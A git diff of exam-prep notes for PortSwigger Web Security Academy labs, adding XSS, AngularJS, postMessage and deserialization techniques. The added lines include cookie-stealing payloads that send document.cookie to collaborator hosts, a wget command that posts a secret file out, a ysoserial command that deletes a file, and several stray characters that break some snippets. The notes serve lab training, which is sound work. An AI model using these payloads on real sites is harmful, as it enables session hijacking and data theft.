@@ -11,7 +11,7 @@
 * Server-Side Prototype Pollution Scanner
 * DOM Invader (burp browser)
 * Java Deserialization Scanner
-
+1
 ## Tips:
 1. Use targeted scan (in Intruder highlight insertion point and use option run targeted scan)   
 2. Passas much mystery labs as possible and note and repeat those with mistakes  
@@ -19,6 +19,31 @@
 
 ## XSS
 1. If "Search" or "Comments" functionality is present - scan them for XSS.  
+3. Review the source code to identify the sources , sinks or methods that may lead to exploit, list of samples:
+```
+document.write()
+window.location
+document.cookie
+eval()
+document.domain
+WebSocket()
+element.src
+postMessage()
+setRequestHeader()
+FileReader.readAsText()
+ExecuteSql()
+sessionStorage.setItem()
+document.evaluate()
+JSON.parse
+ng-app
+URLSearchParams
+replace()
+innerHTML
+location.search
+addEventListener1
+```
+* check with DOM Invader
+* angularJS - `ng-app` in HTML or `angular 1-7-7.js`
 
 ### Payloads
 1. DOM XSS in document.write sink using source location.search inside a select element:  
@@ -30,17 +55,27 @@ Adapted version:
 ```
 "></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
 ```
+source code reveal `document.write` is the sink used with `location.search` allowing us to add `storeId` query parameter with a value containing the JavaScript payload inside a `<select>` statement.
 2. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded.  
+angularJS - `ng-app` in HTML or `angular 1-7-7.js`  
+We simply detect this vuln in Search functionality via passing `{{7*7}}`
 ```
 {{constructor.constructor('alert(1)')()}}
+Or
+{{$on.constructor('alert(1)')()}}
+Or
+{{$eval.constructor('alert(1)')()}}
 ```
 Adapted version:
 ```
 {{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
+Or 
+{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
 ```
+Note: The session cookie property must not have the HttpOnly secure flag set in order for XSS to succeed.
 3. Reflected DOM XSS  
 ```
-\"-alert()}//https://github.com/B310M0R/notes/blob/main/useful.md
+\"-alert()}//
 ```
 Adapted:
 ```
@@ -67,9 +102,10 @@ You can create new form in comment section to steal passwords
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
-});">
+});">document.write()
 ```
-7. Exploiting XSS to perform CSRF  
+
+7. Exploiting XSS to perform CSRF
 There is protection against CSRF, so we need to use the other user's CSRF token in our payload
 ```
 <script>
@@ -254,15 +290,27 @@ Notice that the home page contains an `addEventListener()` call that listens for
 ```
 <iframe src="//0a8100fe032e3917c66ead67003c0020.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 ```
+or
+```
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://Collaborator.com?c=`+document.cookie','*')">
+```
 When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.  
 2. DOM XSS using web messages and a JavaScript URL  
 ```
 <iframe src="https://0a2d00d604a3acfbc67064610056003c.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
 ```
 3. DOM XSS using web messages and JSON.parse  
+Target use web messaging and parses the message as JSON  
+The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a string that is parsed using JSON.parse()  
 ```
 <iframe src="https://0a03009c03110946c0d1aea2003700e0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+Or:
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+    "type": "load-channel",
+    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
+}), "*");'>
 ```
+At the end of the iframe onload values is a "*", this is to indicate the target is any.
 4. DOM-based open redirection  
 ```
 https://0ae900830459749cc2465788006000b5.web-security-academy.net/post?postId=7&url=https://exploit-0ab30006040d744dc2a7561101df00f9.exploit-server.net/exploit#
@@ -293,6 +341,11 @@ location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>
 ```
 wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
 git-cola --repo <url>
+```
+Then to restore previous commits
+```
+git log
+git checkout <commit hash>
 ```
 ## XXE
 The main tip is to scan the whole (not targeted!) request to, usually, /product/stock check  
@@ -728,7 +781,7 @@ X-Forwarded-For: 1.1.1.1
         fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
-```
+```1
 ## Web cache poisoning
 Watch for `/resources/js/tracking.js` file and `X-Cache: hit` header in response. If you got only tracking.js without X-Cache - no cache poisoning here  
 If you got both file and header, the first thing you should try is to inject your exploit server into Host: or X-Forwarded-Host: headers and check them in response  
@@ -789,6 +842,15 @@ Use ysoserial and phpggc
 ```
 java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 | xclip -selection clipboard
 ```
+```
+export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"
+export PATH="${JAVA_HOME}/bin:{$PATH}"
+```
+Exfiltrate data:
+```
+wget --post-file /home/carlos/secret c2ft9nahenbthexwc6hd0c9m4da3ys.burpcollaborator.net
+```
+
 ### Exploits
 1. Modifying serialized data types
 ```
@@ -1082,3 +1144,8 @@ Billing and Delivery Address:
 ## MORE MORE AND MORE
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
 [HackTricks](https://book.hacktricks.xyz/)
+[XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+[payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md)
+
+## To Do:
+* mindmap and algorhithm of detecting triggers for vulnerabilities
